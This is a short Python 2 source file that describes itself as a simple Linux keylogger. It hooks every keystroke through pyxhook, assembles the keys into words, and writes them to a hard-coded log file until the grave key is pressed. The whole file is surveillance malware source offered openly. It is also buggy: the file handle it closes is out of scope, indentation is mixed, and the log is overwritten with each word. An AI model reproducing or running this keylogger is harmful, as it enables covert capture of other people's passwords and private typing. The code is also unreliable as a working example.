"""
Copyright (c) 2015, Aman Deep
All rights reserved.


A simple keylogger witten in python for linux platform
All keystrokes are recorded in a log file.

The program terminates when grave key(`) is pressed

grave key is found below Esc key
"""
import pyxhook
import os

wordList = []

counter = 0

def printWord():
	global counter

	log_file = '/media/rochana/University/Acadamic/Untitled Folder/Key.log'       #this should be change according to user preference.
	fob=open(log_file,'w')

	wordList.pop(counter)
	counter-=1
	print "".join([str(x) for x in wordList] )
	fob.write("".join([str(x) for x in wordList] ))
	counter =0
	del wordList[:]

def OnKeyPress(event):
	global counter
	wordList.append(event.Key)
  	
  		
  	if event.Ascii == 8 :
  		wordList.pop(counter)
  		
  		counter-=1
  		wordList.pop(counter)

	
	
	elif event.Ascii == 32 or event.Ascii == 13:
		
		printWord()

		
	
	elif event.Ascii == 96:
		fob.close()
		new_hook.cancel()
	
	else:
		# fob.write(event.Key)
		# fob.write("\n")
		
		
		# print(wordList[counter])

		counter += 1


new_hook=pyxhook.HookManager()							#instantiate HookManager class
new_hook.KeyDown=OnKeyPress							#listen to all keystrokes
new_hook.HookKeyboard()								#hook the keyboard
new_hook.start()								#start the session
